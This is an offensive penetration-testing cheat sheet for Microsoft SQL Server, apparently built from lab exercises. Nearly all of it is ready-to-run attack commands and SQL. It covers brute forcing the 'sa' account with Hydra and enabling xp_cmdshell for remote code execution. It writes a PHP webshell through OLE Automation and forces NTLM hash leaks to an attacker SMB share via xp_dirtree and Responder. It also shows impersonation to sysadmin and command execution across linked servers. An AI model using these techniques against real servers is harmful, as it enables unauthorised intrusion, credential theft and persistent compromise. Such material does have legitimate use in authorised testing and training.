# MSSQL (Microsoft SQL Server)
**Default Ports:** 1433 (TCP) 
**Key Insight:** MSSQL is often running as a Service Account (High Privileges). If you get code execution (`xp_cmdshell`), you essentially own the machine.
## 1. Discovery & Enumeration
**Goal:** Identify the instance name, version, and auth mechanisms.
### Nmap (Scripts)
**Description:** Enumerates configuration, empty passwords, and version. 
**Syntax:** `nmap -p 1433 --script ms-sql-* <IP>`
```shell
# Comprehensive Scan
# ⚠️ OPSEC: High Noise.
nmap -p 1433 -sV -sC --script "ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess" 10.129.20.13
```
### Metasploit (Ping)
**Description:** Finds hidden instances or non-standard ports via UDP broadcast.
```shell
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 10.129.20.0/24
run
```
### PowerUpSQL
Discover instances and check if your current user has access.
```powershell
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1

# Find SQL Servers in the domain
Get-SQLInstanceDomain

# Query a specific instance
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
## 2. Authentication & Connection
**Goal:** Connect to the database using credentials.
### Impacket MSSQLClient (Best for Hackers)
**Description:** A Python client that automates RCE and hash stealing. 
**Syntax:** `impacket-mssqlclient <User>:<Pass>@<IP>`
```shell
# SQL Auth (Local 'sa' account)
impacket-mssqlclient sa:Password123@10.129.20.13

# Windows Auth (Domain Account)
# -windows-auth: Forces Kerberos/NTLM authentication
impacket-mssqlclient INLANEFREIGHT/julio:Password123@10.129.20.13 -windows-auth

# Syntax: mssqlclient.py <Domain>/<User>:<Pass>@<Target_IP> -windows-auth
mssqlclient.py INLANEFREIGHT/DAMUNDSEN:SQL1234!@172.16.5.150 -windows-auth
```
### Linux CLI (`sqsh`)
**Description:** Legacy tool, behaves like a standard shell. 
**Syntax:** `sqsh -S <Target> -U <User> -P <Pass>`
```shell
# -h: Disable headers (clean output)
sqsh -S 10.129.20.13 -U sa -P 'Password123!' -h
```
### Hydra (Brute Force)
**Target:** The `sa` (System Administrator) account is the primary target.
```shell
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://10.129.20.13
```
## 3. Internal Enumeration (SQL Queries)
**Context:** You are connected via `sqsh` or `mssqlclient`.
```sql
-- 1. Version & User
SELECT @@version;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin'); -- Returns 1 if you are Admin

-- 2. List Databases
SELECT name FROM sys.databases;

-- 3. List Tables in current DB
SELECT * FROM information_schema.tables;

-- 4. Check for Impersonation Candidates
-- Finds users you can "become" (PrivEsc)
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```
## 4. Attack: Remote Code Execution (RCE)
**Goal:** Execute OS commands on the server.
### Method 1: xp_cmdshell (Standard)
**Description:** Enables the legacy shell command feature. 
**Requirement:** `sysadmin` privileges.

**Impacket (Auto):**
```shell
# Inside mssqlclient prompt:
enable_xp_cmdshell
xp_cmdshell whoami
```

**Manual (SQL):**
```sql
-- Enable Advanced Options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute Command
EXEC xp_cmdshell 'whoami';
```
### Method 2: OLE Automation (File Write)
**Description:** Uses Windows COM objects to write files (e.g., a PHP Webshell) to disk. Use this if `xp_cmdshell` is blocked/monitored.
```sql
-- 1. Enable OLE Automation
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- 2. Write File (Webshell)
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
## 5. Attack: Stealing NTLM Hashes
**Concept:** Force the MSSQL Service Account to authenticate to your machine via SMB. 
**Tools:** `Responder` (Listener) + `xp_dirtree` (Trigger).

**Step 1: Start Responder (Attacker)**
```shell
sudo responder -I tun0
```

**Step 2: Trigger Auth (Victim SQL)**
```sql
-- Point xp_dirtree to YOUR IP
-- The server tries to list files on your share and sends its NTLM hash.
EXEC master..xp_dirtree '\\10.10.14.5\share';

-- Alternative triggers:
EXEC master..xp_subdirs '\\10.10.14.5\share';
EXEC master..xp_fileexist '\\10.10.14.5\share';
```
## 6. Attack: Privilege Escalation (Impersonation)
**Concept:** If you have the `IMPERSONATE` permission, you can escalate to `sa` (System Admin).
```sql
-- 1. Check current user
SELECT SYSTEM_USER;

-- 2. Impersonate SA
EXECUTE AS LOGIN = 'sa';

-- 3. Verify
SELECT SYSTEM_USER; -- Should be 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin'); -- Should be 1
```
## 7. Attack: Lateral Movement (Linked Servers)
**Concept:** MSSQL servers are often "Linked" to allow cross-querying. If your server is linked to another, you can execute commands on the _remote_ server.
### Discovery
```sql
-- List Linked Servers
SELECT srvname, isremote FROM sysservers;
```
### Remote Execution (OpenQuery)
**Syntax:** `EXECUTE(...) AT [RemoteServer]`
```sql
-- 1. Check Version of Remote Server
EXECUTE('select @@version') AT [REMOTE_SRV01];

-- 2. Enable xp_cmdshell on Remote Server (If you have privileges)
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [REMOTE_SRV01];

-- 3. Execute Command on Remote Server
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [REMOTE_SRV01];
```